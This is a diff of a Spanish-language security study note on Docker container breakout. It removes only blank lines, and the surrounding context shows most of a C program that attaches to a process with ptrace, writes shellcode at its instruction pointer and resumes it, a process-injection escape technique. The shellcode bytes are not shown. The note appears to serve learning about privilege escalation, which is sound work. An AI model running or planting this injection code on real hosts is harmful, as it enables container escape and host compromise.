@@ -1,7 +1,6 @@
 ---
 Tema: "[[Escalada de Privilegios]]"
 ---
-
 # 🐳 Docker Breakout: Escape de Contenedores
 
 > [!danger] Concepto crítico de seguridad
@@ -151,7 +150,6 @@ int inject_data(pid_t pid, unsigned char *src, void *dst, int len) {
     int i;
     uint32_t *s = (uint32_t *) src;
     uint32_t *d = (uint32_t *) dst;
-
     for (i = 0; i < len; i+=4, s++, d++) {
         if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0) {
             perror("ptrace(POKETEXT):");
@@ -164,7 +162,6 @@ int inject_data(pid_t pid, unsigned char *src, void *dst, int len) {
 int main(int argc, char *argv[]) {
     pid_t target;
     struct user_regs_struct regs;
-
     if (argc != 2) {
         fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
         exit(1);
@@ -172,34 +169,27 @@ int main(int argc, char *argv[]) {
     
     target = atoi(argv[1]);
     printf("+ Tracing process %d\n", target);
-
     if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
         perror("ptrace(ATTACH):");
         exit(1);
     }
-
     printf("+ Waiting for process...\n");
     wait(NULL);
-
     printf("+ Getting Registers\n");
     if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0) {
         perror("ptrace(GETREGS):");
         exit(1);
     }
-
     printf("+ Injecting shell code at %p\n", (void*)regs.rip);
     inject_data(target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
-
     regs.rip += 2;
     printf("+ Setting instruction pointer to %p\n", (void*)regs.rip);
-
     if ((ptrace(PTRACE_SETREGS, target, NULL, &regs)) < 0) {
         perror("ptrace(GETREGS):");
         exit(1);
     }
     
     printf("+ Run it!\n");
-
     if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0) {
         perror("ptrace(DETACH):");
         exit(1);
